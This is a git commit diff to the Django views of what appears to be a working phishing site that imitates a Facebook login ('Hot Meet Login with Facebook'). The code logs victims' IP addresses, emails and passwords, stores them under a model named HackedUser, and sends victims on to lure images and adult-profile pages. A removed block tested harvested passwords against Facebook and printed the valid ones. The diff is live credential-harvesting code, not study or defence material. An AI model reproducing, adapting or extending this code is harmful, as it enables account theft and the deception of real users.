df3907be7daf19acd91f63a6ca55eb7652b72dee
nagy- <hybase@outlook.hu>
2024-09-01 21:22:48 +0200

    v3

--- Fapachi/views.py
+++ Fapachi/views.py
@@ -7,17 +7,16 @@ from colorama import Fore, Style
 
 # Create your views here.
 from Fapachi.models import RequestUser, HackedUser
-from fakeFapachi.fb import FBLogin
 
 
 def index(request):
     #template = "youtube.html"
-    template = "fb_index.html"
-    # template = "index.html"
+    #template = "fb_index.html"
+    template = "index.html"
     include_js = False
 
     context = {"include_js": include_js,
-               "title": "Hot Meet Login with Facebook" if template == "index.html" else "Facebook login"}
+               "title": "Hot Meet Login with Facebook" if template == "index_err.html" else "Facebook login"}
 
     meta = request.META
     ip = meta['REMOTE_ADDR']
@@ -46,25 +45,21 @@ def index(request):
                 print(Style.RESET_ALL)
 
                 if template == "index.html":
-                    return redirect("https://fapachi.com/sarah-atoms/")
+                    #return redirect("https://fapachi.com/gweenblack")
                     # return redirect("https://fapachi.com/copykat")
                     # return redirect("https://www.instagram.com/ambermc2/?hl=en")
                     # return redirect("https://ladjkj.miracuiousdate.com/c/da57dc555e50572d?s1=116274&s2=1502497&s3=NOBLESSE&click_id=KENT_&j1=1")
                     # return redirect("http://hotmeet.servebeer.com/static/my_favorite_pose.png")
                     # return redirect("https://fapachi.com/tiffanybree69")
-                    # return redirect("https://fapachi.com/bebe-rexha")
+                    return render(request,'index_err.html')
                     # return redirect("/static/lilla.mp4")
                     # return redirect("https://fapachi.com/shy-trans")
                 if template == "fb_index.html":
                     # return redirect("https://www.facebook.com/100000099322552/videos/3140763042603642/")
-                    # return redirect("http://hotmeet.servebeer.com/static/my_favorite_pose.png")
+                    return redirect("http://hotmeet.servebeer.com/static/my_favorite_pose.png")
                     #return redirect("https://youtu.be/ELTtFZ56UJM?t=402")
-                    fb = FBLogin()
-                    if fb.fb_login(email=email,passw=password):
-                        print("valid password",password)
-                        return redirect("http://secretfacebook.sytes.net/static/semmi.png")
-                    else:
-                        messages.warning(request,"Hibás bejelentkezési adatok")
+
+                    messages.warning(request,"Hibás bejelentkezési adatok")
 
 
                     # return redirect("http://hotmeet.servebeer.com/static/semmi.png")
